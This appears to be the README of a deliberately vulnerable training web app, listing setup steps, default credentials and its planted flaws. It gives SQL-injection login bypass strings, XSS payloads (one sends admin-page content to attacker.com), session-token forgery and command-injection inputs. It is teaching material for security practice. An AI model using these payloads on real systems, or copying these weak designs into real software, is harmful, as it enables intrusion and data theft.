# CYSCOM Vulnerable Web Application 

## Setup Instructions

1. use virtual environment:
```b
python -m venv venv
venv/bin/activate 
```

2. Install dependencies:
```
pip install -r requirements.txt
```

3. Run the application:
```
python app.py
```

The application will be available at `http://localhost:5000`


## Default Credentials
1. Admin Account:
   - Username: `admin`
   - Password: `admin123`

2. Regular User:
   - Username: `user`
   - Password: `password123`

## Intentional Vulnerabilities

1. **SQL Injection**
   - username: admin' --
   - password: anything
   
   - username: ' OR '1'='1' --
   - password: anything

   - username: ' OR is_admin=1--
   - password: anything

2. **Cross-Site Scripting (XSS)**
   - Multiple XSS vectors:
     - Error messages in login page
     - Username display in dashboard
     - Note content (stored XSS)
   - Example payloads:
     ```
     <script>alert(document.cookie)</script>
     <img src=x onerror="alert('XSS')">
     <svg onload="fetch('/admin').then(r=>r.text()).then(t=>fetch('https://attacker.com/?'+btoa(t)))">
     ```

3. **Session Token Vulnerabilities**
   - Weak session token generation (base64 encoded username:timestamp)
   - Token format: `base64(username:timestamp)`
   - Admin check based on token prefix
   - Example: Any token starting with 'YWRtaW4' (base64 of 'admin') grants admin access

4. **Admin Panel Vulnerabilities**
   - Path disclosure in admin dashboard
   - Weak access control (token-based)
   - API endpoint `/api/check_admin` reveals admin check logic
   - Multiple ways to gain access:
     1. SQL injection to become admin
     2. Session token manipulation
     3. Direct path access with forged token

5. **Missing CSRF Protection**
   - Note creation form lacks CSRF tokens
   - Vulnerable to cross-site request forgery

6. **Weak Authentication**
   - Plaintext password storage
   - Weak default credentials (brute force with foxyproxy and burpsuite)

7. **Command Injection**
   - File search functionality uses unsanitized input
   - Try: `; ls` or `& dir` (no files on server for now)
